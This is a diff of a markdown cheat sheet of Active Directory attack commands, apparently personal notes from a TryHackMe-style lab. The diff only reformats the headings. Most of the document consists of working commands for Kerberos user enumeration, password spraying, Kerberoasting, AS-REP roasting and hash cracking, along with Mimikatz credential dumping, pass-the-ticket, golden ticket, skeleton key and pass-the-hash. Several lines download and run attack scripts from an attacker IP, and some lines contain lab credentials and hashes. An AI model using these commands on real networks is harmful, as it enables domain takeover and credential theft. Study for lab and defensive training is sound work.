@@ -1,8 +1,8 @@
-#KERBRUTE
-##Path
+# KERBRUTE
+## Path
 ~/hack/tools/kerbrute-1.0.3
 
-##Available Commands:
+## Available Commands:
   bruteforce    Bruteforce username:password combos, from a file or stdin
   bruteuser     Bruteforce a single user's password from a wordlist
   help          Help about any command
@@ -10,25 +10,25 @@
   userenum      Enumerate valid domain usernames via Kerberos
   version       Display version info and quit
 
-##Enumeration
+## Enumeration
 ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
 
-##Password Spray
+## Password Spray
 ./kerbrute_linux_amd64 passwordspray --dc controller.local -d controller.local ./wordlist.txt Password1
 
-#RUBEUS
+# RUBEUS
 
-##Harvest TGT's from Host
+## Harvest TGT's from Host
 Rubeus.exe harvest /interval:30 
 
-##Password Spray
+## Password Spray
 Rubeus.exe brute /password:Password1 /noticket
 
-##Kerberoast
+## Kerberoast
 Rubeus.exe kerberoast
 hashcat -m 13100 -a 0 hash.txt Pass.txt
 
-##AS-REP Roasting -Pre-Auth Disabled
+## AS-REP Roasting -Pre-Auth Disabled
 	* Rubeus.exe asreproast  - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes
 	* Crack those Hashes w/ hashcat - 
 		○ 1.) Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file
@@ -36,35 +36,35 @@ hashcat -m 13100 -a 0 hash.txt Pass.txt
 		○ 3.) hashcat -m 18200 hash.txt Pass.txt - crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200
 	
 
-#IMPACKET
+# IMPACKET
 
-##KERBEROAST
+## KERBEROAST
 Kerberoast - EXECUTED REMOTELY FROM KALI, ENUMRATES AND REQUESTS ALL KERBEROASTABLE ACCOUNTS
 sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.105.214 -request
 
-##AS-REP Roasting
+## AS-REP Roasting
 GetNPUsers.py
 GetNPUsers.py <DOMAIN NAME>/ -no-pass -usersfile usernames.txt
 
-##Dump Secrets
+## Dump Secrets
 secretsdump.py thm-ad/backup:'backup2517860'@thm-ad
 
-#MIMIKATZ
+# MIMIKATZ
 
-##Download and Dump Creds
+## Download and Dump Creds
 iex (iwr http://10.9.80.37/Invoke-Mimikatz.ps1 -UseBasicParsing);Invoke-Mimikatz -DumpCreds
 
-##Dump Hashes
+## Dump Hashes
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 hashcat -m 1000 <hash> rockyou.txt
 
-##Export Tickets
+## Export Tickets
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 
-##Pass the Ticket
+## Pass the Ticket
  Invoke-Mimikatz -Command '"kerberos::ptt [0;59dfa]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi"'
 
-##Golden Ticket Attack
+## Golden Ticket Attack
 
 	1. Execute mimikatz on DC as DA to get krbtgt hash
 		a. Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc 
@@ -77,19 +77,19 @@ Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz)
 
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500 /groups:512 /ptt"'
 
-##Skeleton Key
+## Skeleton Key
 Invoke-Mimikatz -Command '"misc::skeleton"'
 
-#POWERVIEW
+# POWERVIEW
 
 iex (iwr http://10.9.80.37/PowerView3.ps1 -UseBasicParsing)
 
-#EVIL-WINRM
+# EVIL-WINRM
 
-##PTH
+## PTH
 evil-winrm -i thm-ad -u administrator -H 0e0363213e37b94221497260b0bcb4fc
 
-#BLOODHOUND
+# BLOODHOUND
 
 iex (iwr http://10.9.80.37/SharpHound.ps1 -UseBasicParsing)
 Invoke-BloodHound -CollectionMethod ALL
